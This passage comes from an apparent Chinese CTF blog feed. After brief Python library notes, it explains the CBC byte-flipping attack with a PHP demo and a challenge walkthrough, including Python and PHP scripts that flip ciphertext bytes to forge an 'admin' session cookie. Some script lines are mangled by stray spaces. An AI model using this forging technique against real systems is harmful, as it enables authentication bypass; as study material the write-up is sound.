class="headerlink" title="os.popen"></a>os.popen</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">os.system(cmd) 的返回值只会有 0(成功),1,2</span><br><span class="line"></span><br><span class="line">os.popen(cmd) 会吧执行的 cmd 的输出作为值返回。</span><br><span class="line"></span><br><span class="line">os.popen() 可以实现一个“管道”，从这个命令获取的值可以继续被调用。而 os.system 不同，它只是调用，调用完后自身退出，可能返回个 0 吧</span><br><span class="line"></span><br><span class="line">比如，我想得到 ntpd 的进程 id，就要这么做：</span><br><span class="line"></span><br><span class="line">os.popen(<span class="string">'ps -C ntpd | grep -v CMD |awk '</span>&#123; <span class="built_in">print</span> <span class="variable">$1</span> &#125;<span class="string">').readlines()[0]</span></span><br></pre></td></tr></table></figure><h3 id="urlparse"><a href="#urlparse" class="headerlink" title="urlparse"></a>urlparse</h3><p>将urlstring解析成6个部分，它从urlstring中取得URL，并返回元组 (scheme, netloc, path, parameters, query, fragment)，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import urlparse</span><br><span class="line">&gt;&gt;&gt; url=urlparse.urlparse(<span class="string">'http://www.baidu.com/index.php?username=guol'</span>)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> url</span><br><span class="line">ParseResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com'</span>, path=<span class="string">'/index.php'</span>, params=<span class="string">''</span>, query=<span class="string">'username=guol'</span>, fragment=<span class="string">''</span>)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> url.netloc</span><br><span class="line">www.baidu.com</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"></span><br><span class="line">urlparse.urlunparse(parts)</span><br><span class="line"></span><br><span class="line">    从一个元组构建一个url，元组类似urlparse返回的，它接收元组(scheme, netloc, path, parameters, query, fragment)后，会重新组成一个具有正确格式的URL，以便供Python的其他HTML解析模块使用。</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; import urlparse</span><br><span class="line">&gt;&gt;&gt; url=urlparse.urlparse(<span class="string">'http://www.baidu.com/index.php?username=guol'</span>)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> url</span><br><span class="line">ParseResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com'</span>, path=<span class="string">'/index.php'</span>, params=<span class="string">''</span>, query=<span class="string">'username=guol'</span>, fragment=<span class="string">''</span>)</span><br><span class="line">&gt;&gt;&gt; u=urlparse.urlunparse(url)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> u</span><br><span class="line">http://www.baidu.com/index.php?username=guol</span><br></pre></td></tr></table></figure><p>Example：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from urlparse import urlparse</span><br><span class="line">url = <span class="string">"http://web.jarvisoj.com:32778/index.php"</span></span><br><span class="line">urlparts = urlparse(url)</span><br><span class="line"><span class="built_in">print</span> urlparts.hostname,urlparts.port,urlparts.scheme</span><br><span class="line"></span><br><span class="line">输出：web.jarvisoj.com 32778 http</span><br></pre></td></tr></table></figure></p><h2 id="HTTPConnection"><a href="#HTTPConnection" class="headerlink" title="HTTPConnection"></a>HTTPConnection</h2><h3 id="HTTPConnection创建对象"><a href="#HTTPConnection创建对象" class="headerlink" title="HTTPConnection创建对象"></a>HTTPConnection创建对象</h3><p>HTTPConnection(host[, port[, strict[, timeout]]])<br>host: 请求的服务器host，不能带http://开头<br>port: 服务器web服务端口<br>strict: 是否严格检查请求的状态行，就是http1.0/1.1 协议版本的那一行，即请求的第一行，默认为False，为True时检查错误会抛异常<br>timeout: 单次请求的超时时间，没有时默认使用httplib模块内的全局的超时时间</p><h3 id="HTTPConnection对象request方法："><a href="#HTTPConnection对象request方法：" class="headerlink" title="HTTPConnection对象request方法："></a>HTTPConnection对象request方法：</h3><p>说明：<br>发送一个请求</p><p>原型：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">conn.request(method, url[, body[, headers]])</span><br><span class="line">method: 请求的方式，如<span class="string">'GET'</span>,<span class="string">'POST'</span>,<span class="string">'HEAD'</span>,<span class="string">'PUT'</span>,<span class="string">'DELETE'</span>等</span><br><span class="line">url: 请求的网页路径。如：<span class="string">'/index.html'</span></span><br><span class="line">body: 请求是否带数据，该参数是一个字典</span><br><span class="line">headers: 请求是否带头信息，该参数是一个字典，不过键的名字是指定的http头关键字</span><br></pre></td></tr></table></figure></p><h3 id="HTTPConnection对象getresponse方法"><a href="#HTTPConnection对象getresponse方法" class="headerlink" title="HTTPConnection对象getresponse方法"></a>HTTPConnection对象getresponse方法</h3><p>说明：<br>获取一个http响应对象，相当于执行最后的2个回车</p><p>原型/实例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = conn.getresponse()</span><br></pre></td></tr></table></figure></p><h3 id="HTTPResponse对象read方法"><a href="#HTTPResponse对象read方法" class="headerlink" title="HTTPResponse对象read方法"></a>HTTPResponse对象read方法</h3><p>说明：<br>获得http响应的内容部分，即网页源码</p><p>原型：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body = res.read([amt])</span><br></pre></td></tr></table></figure></p><p>amt: 读取指定长度的字符，默认为空，即读取所有内容</p><p>实例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">body = res.read()  </span><br><span class="line">pbody = res.read(10)</span><br></pre></td></tr></table></figure></p><p>返回：<br>网页内容字符串</p><h3 id="conn-getheaders"><a href="#conn-getheaders" class="headerlink" title="conn.getheaders()"></a>conn.getheaders()</h3><p>说明：</p><p>获得http响应头</p><p>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python    </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-    </span></span><br><span class="line">import httplib  </span><br><span class="line">import urllib  </span><br><span class="line">  </span><br><span class="line">   </span><br><span class="line">def sendhttp():  </span><br><span class="line">    data = urllib.urlencode(&#123;<span class="string">'@number'</span>: 12524, <span class="string">'@type'</span>: <span class="string">'issue'</span>, <span class="string">'@action'</span>: <span class="string">'show'</span>&#125;)     </span><br><span class="line">    headers = &#123;<span class="string">"Content-type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,  </span><br><span class="line">               <span class="string">"Accept"</span>: <span class="string">"text/plain"</span>&#125;  </span><br><span class="line">    conn = httplib.HTTPConnection(<span class="string">'bugs.python.org'</span>)  </span><br><span class="line">    conn.request(<span class="string">'POST'</span>, <span class="string">'/'</span>, data, headers)  </span><br><span class="line">    httpres = conn.getresponse()  </span><br><span class="line">    <span class="built_in">print</span> httpres.status  </span><br><span class="line">    <span class="built_in">print</span> httpres.reason  </span><br><span class="line">    <span class="built_in">print</span> httpres.read()  </span><br><span class="line">             </span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:    </span><br><span class="line">    sendhttp()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hash 长度扩展攻击原理和实例&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://archimesan.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CBC字节翻转攻击</title>
    <link href="http://archimesan.me/2017/12/22/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    <id>http://archimesan.me/2017/12/22/CBC字节翻转攻击/</id>
    <published>2017-12-22T04:04:31.000Z</published>
    <updated>2019-03-22T07:03:56.822Z</updated>
    
    <content type="html"><![CDATA[<p>CBC 字节翻转攻击原理和例题</p><a id="more"></a><h1 id="CBC-字节翻转攻击原理"><a href="#CBC-字节翻转攻击原理" class="headerlink" title="CBC 字节翻转攻击原理"></a>CBC 字节翻转攻击原理</h1><p>加密过程</p><p><img src="加密过程.png" alt></p><p>Plaintext：待加密的数据。</p><p>IV：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。</p><p>Key：被一些如 AES 的对称加密算法使用。</p><p>Ciphertext：加密后的数据。</p><p>在这里重要的一点是，CBC 工作于一个固定长度的比特组，将其称之为块。在本文中，我们将使用包含 16 字节的块。</p><p>因为作者讨厌高数（和译者一样），所以作者造了一些自己的公式（方便记忆）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">● Ciphertext-0 = Encrypt(Plaintext XOR IV)—只用于第一个组块</span><br><span class="line">● Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—用于第二及剩下的组块</span><br></pre></td></tr></table></figure></p><p>注意：正如你所见，前一块的密文用来产生后一块的密文。</p><p><img src="加密过程1.png" alt></p><p>Decryption Process<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">● Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块</span><br><span class="line">● Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块</span><br></pre></td></tr></table></figure></p><p>注意：Ciphertext-N-1（密文-N-1）是用来产生下一块明文；这就是字节翻转攻击开始发挥作用的地方。如果我们改变Ciphertext-N-1（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！You got it? 别担心，下面我们将看到一个详细的例子。与此同时，下面的这张图也可以很好地说明这种攻击：</p><p><img src="加密过程2.png" alt></p><h2 id="一个例子（CBC-Blocks-of-16-bytes）"><a href="#一个例子（CBC-Blocks-of-16-bytes）" class="headerlink" title="一个例子（CBC Blocks of 16 bytes）"></a>一个例子（CBC Blocks of 16 bytes）</h2><p>比方说，我们有这样的明文序列：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:4:<span class="string">"name"</span>;s:6:<span class="string">"sdsdsd"</span>;s:8:<span class="string">"greeting"</span>;s:20:<span class="string">"echo 'Hello sdsdsd!'"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>我们的目标是将 “s:6” 当中的数字6转换成数字 “7”。我们需要做的第一件事就是把明文分成 16 个字节的块：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">● Block 1:a:2:&#123;s:4:<span class="string">"name"</span>;</span><br><span class="line">● Block 2:s:6:<span class="string">"sdsdsd"</span>;s:8</span><br><span class="line">● Block 3::<span class="string">"greeting"</span>;s:20</span><br><span class="line">● Block 4::<span class="string">"echo 'Hello sd</span></span><br><span class="line"><span class="string">● Block 5:sdsd!'"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>因此，我们的目标字符位于块 2，这意味着我们需要改变块1的密文来改变第二块的明文。<br>有一条经验法则是（注：结合上面的说明图可以得到），你在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。所以我们目标的偏移量是2：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">● [0] = s</span><br><span class="line">● [1] = :</span><br><span class="line">● [2] = 6</span><br></pre></td></tr></table></figure></p><p>因此我们要改变在第一个密文块当中，偏移量是 2 的字节。正如你在下面的代码当中看到的，在第 2 行我们得到了整个数据的密文，然后在第 3 行中，我们改变块1中偏移量为 2 的字节，最后我们再调用解密函数。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="variable">$v</span> = <span class="string">"a:2:&#123;s:4:"</span>name<span class="string">";s:6:"</span>sdsdsd<span class="string">";s:8:"</span>greeting<span class="string">";s:20:"</span><span class="built_in">echo</span> <span class="string">'Hello sdsdsd!'</span><span class="string">";&#125;"</span>;</span><br><span class="line">2. <span class="variable">$enc</span> = @encrypt(<span class="variable">$v</span>);</span><br><span class="line">3. <span class="variable">$enc</span>[2] = chr(ord(<span class="variable">$enc</span>[2]) ^ ord(<span class="string">"6"</span>) ^ ord (<span class="string">"7"</span>));</span><br><span class="line">4. <span class="variable">$b</span> = @decrypt(<span class="variable">$enc</span>);</span><br></pre></td></tr></table></figure></p><p>运行这段代码后，我们可以将数字 6 变为 7：</p><p><img src="3.png" alt></p><p>但是我们在第 3 行中，是如何改变字节成为我们想要的值呢？</p><p>基于上述的解密过程，我们知道有，A = Decrypt(Ciphertext) 与 B = Ciphertext-N-1 异或后最终得到 C = 6。等价于：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C = A XOR B</span><br></pre></td></tr></table></figure></p><p>所以，我们唯一不知道的值就是 A（注：对于B，C来说）（block cipher decryption）;借由 XOR，我们可以很轻易地得到 A 的值：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A = B XOR C</span><br></pre></td></tr></table></figure></p><p>最后，A XOR B XOR C 等于 0。有了这个公式，我们可以在 XOR 运算的末尾处设置我们自己的值，就像这样：</p><p>A XOR B XOR C XOR “7”会在块 2 的明文当中，偏移量为 2 的字节处得到 7。</p><p>下面是相关原理实现的 PHP 源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'MY_AES_KEY'</span>, <span class="string">"abcdef0123456789"</span>);</span><br><span class="line"><span class="keyword">function</span> aes(<span class="variable">$data</span>, <span class="variable">$encrypt</span>) &#123;</span><br><span class="line">    <span class="variable">$aes</span> = mcrypt_module_open(MCRYPT_RIJNDAEL_128, <span class="string">''</span>, MCRYPT_MODE_CBC, <span class="string">''</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="string">"1234567891234567"</span>;</span><br><span class="line">    mcrypt_generic_init(<span class="variable">$aes</span>, MY_AES_KEY, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$encrypt</span> ? mcrypt_generic(<span class="variable">$aes</span>,<span class="variable">$data</span>) : mdecrypt_generic(<span class="variable">$aes</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">'MY_MAC_LEN'</span>, 40);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> encrypt(<span class="variable">$data</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> aes(<span class="variable">$data</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> decrypt(<span class="variable">$data</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = rtrim(aes(<span class="variable">$data</span>, <span class="literal">false</span>), <span class="string">"\0"</span>);</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$v</span> = <span class="string">"a:2:&#123;s:4:\"name\";s:6:\"sdsdsd\";s:8:\"greeting\";s:20:\"echo 'Hello sdsdsd!'\";&#125;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Plaintext before attack: <span class="variable">$v</span>\n"</span>;</span><br><span class="line"><span class="variable">$b</span> = array();</span><br><span class="line"><span class="variable">$enc</span> = array();</span><br><span class="line"><span class="variable">$enc</span> = @encrypt(<span class="variable">$v</span>);</span><br><span class="line"><span class="variable">$enc</span>[2] =  chr(ord(<span class="variable">$enc</span>[2]) ^ ord(<span class="string">"6"</span>) ^ ord (<span class="string">"7"</span>));</span><br><span class="line"><span class="variable">$b</span> = @decrypt(<span class="variable">$enc</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Plaintext AFTER attack : <span class="variable">$b</span>\n"</span>;</span><br></pre></td></tr></table></figure></p><h1 id="一道ctf题目"><a href="#一道ctf题目" class="headerlink" title="一道ctf题目"></a>一道ctf题目</h1><p><a href="http://47.93.190.246:49168/index.php" target="_blank" rel="noopener">http://47.93.190.246:49168/index.php</a></p><p><img src="1_1.png" alt></p><p>无法用 admin 登录，其它帐号名任意登录。<br>题目提示 CBC 字节翻转 有 .index.php.swp 文件下载。<br>用 vim -r .index.php.swp 打开即，用 :w index.php 另存为 index.php，即可还原出源代码。<br>关键代码段：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, file_get_contents(<span class="string">'/root/key'</span>));</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">get_random_iv</span></span>()&#123;</span><br><span class="line">    <span class="variable">$random_iv</span>=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;16;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$random_iv</span>.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$random_iv</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> login(<span class="variable">$info</span>)&#123;</span><br><span class="line">    <span class="variable">$iv</span> = get_random_iv();</span><br><span class="line">    <span class="variable">$plain</span> = serialize(<span class="variable">$info</span>);</span><br><span class="line">    <span class="variable">$cipher</span> = openssl_encrypt(<span class="variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'username'</span>] = <span class="variable">$info</span>[<span class="string">'username'</span>];</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode(<span class="variable">$iv</span>));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode(<span class="variable">$cipher</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">check_login</span></span>()&#123;</span><br><span class="line">    <span class="keyword">if</span>(isset(<span class="variable">$_COOKIE</span>[<span class="string">'cipher'</span>]) &amp;&amp; isset(<span class="variable">$_COOKIE</span>[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        <span class="variable">$cipher</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">'cipher'</span>]);</span><br><span class="line">        <span class="variable">$iv</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$plain</span> = openssl_decrypt(<span class="variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>))&#123;</span><br><span class="line">            <span class="variable">$info</span> = unserialize(<span class="variable">$plain</span>) or die(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode(<span class="variable">$plain</span>).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">'username'</span>] = <span class="variable">$info</span>[<span class="string">'username'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">show_homepage</span></span>()&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;hello '</span>.<span class="variable">$_SESSION</span>[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们登录名 admiz 密码 bb 的 COOKIE 信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: 47.93.190.246:49168</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 40</span><br><span class="line">Referer: http://47.93.190.246:49168/index.php</span><br><span class="line">Cookie: PHPSESSID=7nld2kvg1t560mtvuniqo63u02; iv=KYVIlJkfaja2cM8pENnLDg%3D%3D; cipher=3TFLhFRlhpfCeag8v7t% 2BtsVZnK%2Bl5YbtAHidL7blfvJMKe11Mwc% 2FBcFvys1PUmX51WYas4LuK62qXaSWihjHwQ%3D%3D </span><br><span class="line">Connection: close </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p><p>尝试更改 iv 或 cipher 的单个字节<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YToyOntzOjg6InVzZXJuYYLHOrSKF5f/2bmVuBfm/45zOjg6InBhc3EXb3JkIjtzOjI6 ImJiIjt9</span><br></pre></td></tr></table></figure></p><p>BASE64 解码看一下信息，发现序列完全被破坏：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:<span class="string">"usernaÇ:´ÿÙ¹¸æÿs:8:"</span>pasqord<span class="string">";s:2:"</span>bb<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure></p><p>再换个字节：a:2:{s:8:”username”;s:5:”admiz”;ÚJW¹¼=;o·$YL::”bb”;} 反序列化失败。 </p><p>我们要修改 admiz 为 admin 先分组，我们只关心前两组<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一组： a:2:&#123;s:8:<span class="string">"userna </span></span><br><span class="line"><span class="string">第二组： me"</span>;s:5:<span class="string">"admiz"</span>;</span><br></pre></td></tr></table></figure></p><p>z 位于第二组第 14 个字节，为改变 z 我们要改变第一组第 14 个字节<br>我们将其异或掉 z,再异或以 n。<br>代码如下：</p><p>python版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import base64,urllib2</span><br><span class="line">cipher=base64.b64decode(urllib2.unquote(<span class="string">"3TFLhFRlhpfCe ag8v7t%2BtsVZnK%2Bl5YbtAHidL7blfvJMKe11Mwc% 2FBcFvys1PUmX51WYas4LuK62qXaSWihjHwQ%3D%3D"</span>)) newcipher=cipher[0:13]+chr(ord(cipher[13])^ord(<span class="string">'z'</span>)^or d(<span class="string">'n'</span>))+cipher[14:] newcipher=urllib2.quote(base64.b64encode(newcipher)) </span><br><span class="line"><span class="built_in">print</span> newcipher</span><br></pre></td></tr></table></figure></p><p>php版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$cipher</span> = <span class="string">"3TFLhFRlhpfCeag8v69+tsVZnK+l5YbtAHidL7blfvJMKe11Mwc/BcFvys1PUmX51WYas4LuK62qXaSWihjHwQ=="</span>;</span><br><span class="line"><span class="variable">$cipher</span> = base64_decode(<span class="variable">$cipher</span>);</span><br><span class="line"><span class="variable">$cipher</span>[9] = chr(ord(<span class="variable">$cipher</span>[9]) ^ ord(<span class="string">"q"</span>) ^ ord (<span class="string">"a"</span>));</span><br><span class="line"><span class="variable">$newcipher</span> = base64_encode(<span class="variable">$cipher</span>);</span><br><span class="line"><span class="variable">$newcipher1</span> = urlencode(<span class="variable">$newcipher</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newcipher</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newcipher1</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3TFLhFRlhpfCeag8v69%2BtsVZnK% 2Bl5YbtAHidL7blfvJMKe11Mwc/BcFvys1PUmX51WYas4LuK62qXaS WihjHwQ%3D%3D</span><br></pre></td></tr></table></figure></p><p>将此字符串作新的 cipher 值与原 iv 值一起提交返回如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;base64 _decode(<span class="string">'GM6nRG1acpWMpWWr1Wz8Cm1lIjtzOjU6ImFkbWluIjtzO jg6InBhc3N3b3JkIjtzOjI6ImJiIjt9'</span>) can<span class="string">'t unserialize&lt;/p&gt;</span></span><br></pre></td></tr></table></figure></p><p>Base64解码得到<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Î§DmZr¥e«Õlü me<span 